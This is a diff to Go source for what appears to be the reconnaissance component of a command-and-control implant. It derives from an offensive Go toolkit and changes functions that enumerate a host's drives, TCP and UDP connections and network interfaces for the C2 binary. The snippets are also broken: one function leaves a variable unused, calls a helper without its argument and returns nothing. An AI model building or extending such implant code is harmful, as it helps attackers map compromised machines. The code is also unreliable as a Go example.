@@ -33,7 +33,10 @@ That calls the others depending on the request from the
 Command and Control binary
 */
 func gather_intel(intel_struct HostIntel) (HostIntel, error) {
-
+	// maybe you could add some logic to control this thing?
+	// using that function that makes a new struct
+	intel_container := NewHostIntel()
+	get_interfaces()
 }
 
 func get_interfaces(intel_struct *HostIntel) {
@@ -46,7 +49,7 @@ func get_interfaces(intel_struct *HostIntel) {
 //https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/hardrives.go
 
 // GetDrives iterates through the alphabet to return a list of mounted drives
-func GetDrives() []disk.PartitionStat {
+func GetDrives(intel_struct *HostIntel) []disk.PartitionStat {
 	partitions, derp := disk.Partitions(true)
 	if derp != nil {
 		Error_printer(derp, "generic error, fix me plz lol <3!")
@@ -57,18 +60,18 @@ func GetDrives() []disk.PartitionStat {
 // ToDo: add functions for IPv6 connections
 
 // GetTCPConnections returns a slice describing TCP connections
-func GetTCPConnections() []netstat.SockTabEntry {
+func GetTCPConnections(intel_struct *HostIntel) []netstat.SockTabEntry {
 
 	// TCP sockets
 	list_of_connections, derp := netstat.TCPSocks(netstat.NoopFilter)
 	if derp != nil {
 		Error_printer(derp, "generic error, fix me plz lol <3!")
 	}
-	return list_of_connections, derp
+	return list_of_connections
 }
 
 // GetUDPConnections returns a slice describing UDP connections
-func GetUDPConnections() []netstat.SockTabEntry {
+func GetUDPConnections(intel_struct *HostIntel) []netstat.SockTabEntry {
 	// UDP sockets
 	list_of_connections, derp := netstat.UDPSocks(netstat.NoopFilter)
 	if derp != nil {
